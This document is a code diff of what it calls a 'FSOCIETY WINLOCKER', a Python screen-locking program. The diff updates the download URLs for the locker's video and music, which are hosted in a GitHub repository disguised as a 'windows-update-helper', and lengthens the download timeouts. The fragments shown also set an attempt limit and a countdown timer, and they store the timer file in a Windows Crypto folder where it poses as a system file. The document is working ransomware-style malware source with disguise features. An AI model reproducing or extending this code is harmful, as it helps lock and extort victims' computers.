@@ -1,5 +1,5 @@
 # ============================================================
-# FSOCIETY WINLOCKER v6.2 — ФИНАЛЬНЫЙ
+# FSOCIETY WINLOCKER v6.3 — ФИНАЛЬНЫЙ РАБОЧИЙ
 # GitHub: ippo123459-bit/winlocker
 # ============================================================
 import subprocess, sys, os, time, threading, tempfile, ctypes, winreg, urllib, random, string
@@ -22,8 +22,8 @@ MAX_ATTEMPTS = 5
 TIMER_MINUTES = 60
 TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Crypto", "RSA", "timer.dat")
 
-VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
-MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
+VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/releases/download/v1.0/fuxEcorp.mp4"
+MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/releases/download/v1.0/locker_music.mp3"
 
 attempts_left = MAX_ATTEMPTS
 
@@ -36,14 +36,14 @@ def download_file(url, path):
     
     try:
         req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-        with urllib.request.urlopen(req, timeout=30) as r, open(path, 'wb') as f:
+        with urllib.request.urlopen(req, timeout=60) as r, open(path, 'wb') as f:
             f.write(r.read())
         if os.path.getsize(path) > 1000: return True
     except: pass
     
     try:
         import requests
-        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=30)
+        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=60)
         with open(path, 'wb') as f: f.write(r.content)
         if os.path.getsize(path) > 1000: return True
     except: pass
